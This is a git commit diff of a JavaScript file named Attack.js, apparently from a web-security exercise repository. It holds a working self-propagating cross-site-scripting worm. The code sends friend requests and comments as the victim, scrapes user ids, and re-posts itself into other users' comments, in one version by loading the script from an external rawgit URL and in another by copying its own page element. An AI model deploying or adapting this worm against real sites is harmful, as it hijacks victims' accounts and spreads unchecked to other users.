5a840bc316c32b9046035706373700831e6336b0
JonLMyers <jlm4508@g.rit.com>
2016-11-29 18:58:41 -0500

    fixed?

--- Attack.js
+++ Attack.js
@@ -1,16 +1,14 @@
-function fight(){
-  $.get("add_friend.php?id=114");
-  $.get('add_comment.php?id=114&comment='.concat(Date()));
-  $.get("home.php", function(data, status){
-    var ln = data.search("id=");
-    var ids = data.substr(ln, 6);
-    var id = ids.match(/\d+/)[0];
-    var a = 'add_comment.php?id='.concat(id);
-    var b = '&comment=<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js">').concat('<\/script>');
-    $.get(a+b);
-    alert("It worms");
-    });
-}
-fight();
+$( document ).ready(function(){
+
+    $.get("add_friend.php?id=114");
+    $.ajax({url:"add_comment.php?id=114&comment="+ new Date()});
+    $.get("home.php", function(data, status){
+      var ln = data.search("id=");
+      var ids = data.substr(ln, 6);
+      var id = ids.match(/\d+/)[0];
+			$.ajax({url:"add_comment.php?id="+id+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
+	});
+});
+
 //<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js"></script>
 //https://drive.google.com/host/0B_BwSrIRFmFza01yWEV3aWQ2eHM
